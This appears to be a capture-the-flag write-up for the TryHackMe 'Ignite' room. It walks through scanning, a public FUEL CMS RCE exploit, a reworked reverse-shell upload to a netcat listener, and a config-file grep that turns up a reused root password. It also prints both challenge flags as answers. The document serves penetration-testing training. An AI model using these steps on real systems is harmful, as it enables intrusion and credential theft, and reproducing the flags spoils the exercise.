# TryHackMe - Ignite

## 🛠 Reco

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.132.139
```

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.132.139 -x .php,.txt,.html,.js,.md | tee go_scan

```

**Results:**
```
/index.html           (Status: 301) [Size: 0] [--> ./]
/img                  (Status: 301) [Size: 0] [--> img/]
/index                (Status: 200) [Size: 16597]
/.html                (Status: 403) [Size: 293]
/index.php            (Status: 200) [Size: 16597]
/home                 (Status: 200) [Size: 16597]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.10.132.139/assets/]
/README.md            (Status: 200) [Size: 1427]
/robots.txt           (Status: 200) [Size: 30]
/contributing.md      (Status: 200) [Size: 6502]
/offline              (Status: 200) [Size: 70]
/fuel                 (Status: 301) [Size: 313] [--> http://10.10.132.139/fuel/]
```

Just the main page really.

## 📌 Task 1: Root it!

### Initial foothold


On the main page we have the login details. That's nice!


```
To access the FUEL admin, go to:
http://10.10.132.139/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```

I spent more time than I should, hunting around fuel CMS trying to find a way to upload and change a php page. All my attempts failed!

As a last ditch attempt I thought I would google "fuel cms 1.4 explot"

Wow, there is a known vulnerability. Note to self do this first next time! There is a great github page made by p0dalirius here - https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE

Let's give it a go! I grabbed the console.py and the webshell.php files.

```bash
python3 console.py -t http://10.10.181.164 
```

That worked. I am in as www-data. Let's cat the user flag

```bash
cat user.txt
6470e394cbf6dab6a91682cc8585059b
```

**Q. User.txt
A. 6470e394cbf6dab6a91682cc8585059b

## Excalate to root

The problem I have is this webshell.php sucks. It would be much better if we had a reverse shell. So instead of struggling along with this current exploit I decided to rewrite the vulnerability to use pentestmonkey revershell.php. My version can be found in my github directory. 

Now let's give it a go. First, setup a nc listener and then run the exploit - easy!

```bash
rlwrap nc -nlvp 9999
python3 CVE-2018-16763-FuelCMS-1.4.1-RCE.py -t http://10.10.181.164 
```

**Results:**
```
[+] Reverse shell uploaded: http://10.10.181.164/89eb47d009074f32b74fc911e84a0bc0.php
[*] Triggering reverse shell: http://10.10.181.164/89eb47d009074f32b74fc911e84a0bc0.php

```
Now in a reverse shell, let’s stabilize it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl Z
stty raw -echo; fg
export TERM=xterm
```

Much better. Time to get to work! Let's run through my plan. We'll stop if we hit pay-dirt

```
Things to try

1. sudo -l
2. suid files
3. cron jobs
4. random password files
5. linpeas.sh
```

### 1. sudo -l

**Results:**
```
Nope it asked for a password. 
```


### 2. suid files

Next I looked for suid files.

```bash
find / -type f -perm -u=s 2>/dev/null
```

**Results:**
```
/usr/sbin/mount.cifs
/usr/sbin/mount.nfs
/usr/sbin/pppd
/usr/bin/kismet_cap_nrf_mousejack
/usr/bin/kismet_cap_ti_cc_2540
/usr/bin/kismet_cap_linux_bluetooth
/usr/bin/rsh-redone-rsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/kismet_cap_nxp_kw41z
/usr/bin/kismet_cap_nrf_51822
/usr/bin/chfn
/usr/bin/kismet_cap_nrf_52840
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/rsh-redone-rlogin
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount3
/usr/bin/vmware-user-suid-wrapper
/usr/bin/kismet_cap_linux_wifi
/usr/bin/kismet_cap_rz_killerbee
/usr/bin/kismet_cap_hak5_wifi_coconut
/usr/bin/umount
/usr/bin/mount
/usr/bin/ntfs-3g
/usr/bin/kismet_cap_ti_cc_2531
/usr/bin/kismet_cap_ubertooth_one
/usr/bin/chsh
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/xorg/Xorg.wrap
/usr/lib/chromium/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

nope, nothing interesting here

### 3. cronjobs

Then I uploaded pspy32 using a python web server on my attacker pc. 

**Results:**
```
nothing! Quiet as a mouse.
```


### 4. random passwords in files

OK. last thing to check before we pull out linpeas. Let's have a quick hunt through the fuel configs. A simple way to do this is search for "root" and print 2 lines if found. Sometimes we get lucky!

```bash
cd /var/www/html/
grep -ir -A 2 "root" . 2> /dev/null
```

**Results:**
```
./fuel/application/config/database.php: 'username' => 'root',
./fuel/application/config/database.php- 'password' => 'mememe',
./fuel/application/config/database.php- 'database' => 'fuel_schema',
```
wow. That can't be the password can it? let's try

```bash
su root
#
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```

**Q. Escalate your privileges and get the flag in root.txt
A. b9bbcb33e11b80be759c4e844862482d


